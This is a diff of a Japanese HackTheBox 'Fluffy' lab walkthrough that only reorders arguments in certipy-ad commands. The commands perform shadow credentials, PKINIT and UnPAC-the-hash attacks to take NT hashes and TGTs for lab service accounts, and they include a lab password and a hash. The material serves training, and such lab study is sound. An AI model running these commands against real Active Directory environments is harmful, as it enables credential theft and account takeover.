@@ -248,7 +248,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 それでは、攻撃者が作成したpfxに対応する公開鍵をwinrm_svcに設定を実施  
 step1では5986番はクロースであったため、pfxを使用したpassthecertificateによるwinrmログインはできないもよう
 ```sh
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc add
+└─$ certipy-ad shadow -account winrm_svc -target-ip 10.129.180.164 -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -264,7 +264,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Saving certificate and private key to 'winrm_svc.pfx'
 [*] Saved certificate and private key to 'winrm_svc.pfx'
  
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc list
+└─$ certipy-ad shadow -account winrm_svc -target-ip 10.129.180.164 -u 'p.agila@fluffy.htb' -p 'prometheusx-303' list
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -279,7 +279,7 @@ pkinit環境下のtgtおよびtgsには、pacにntハッシュが含まれる設
 tgtはkrbtgtキーのみ復号可能だが、自身に対するtgsの場合は自身のセッションキーで復号可能となり、結果pac内のntハッシュが取得可能になる  
 詳細は[こちら](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash#theory)や[こちら](https://labs.lares.com/fear-kerberos-pt2/#UNPAC)
 ```sh
-└─$ certipy-ad auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.180.164 
+└─$ certipy-ad auth -pfx winrm_svc.pfx -dc-ip 10.129.180.164 -username winrm_svc -domain fluffy.htb
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
@@ -295,7 +295,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 ちなみに「auto」コマンドで、公開鍵登録からtgt取得までを自動的に実行できるので便利
 ```sh
-└─$ certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -target-ip 10.129.180.164 -account winrm_svc auto
+└─$ certipy-ad shadow -account winrm_svc -target-ip 10.129.180.164 -u 'p.agila@fluffy.htb' -p 'prometheusx-303' auto
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
@@ -345,7 +345,7 @@ step3で侵害したwinrm_svcが所属するservice accountsグループはca_sv
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_03.png">  
 ということで、ca_svcのtgtとntハッシュを取得
 ```sh
-└─$ certipy-ad shadow -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 -target-ip 10.129.180.164 -account ca_svc auto
+└─$ certipy-ad shadow -account ca_svc -target-ip 10.129.180.164 -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767  auto
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
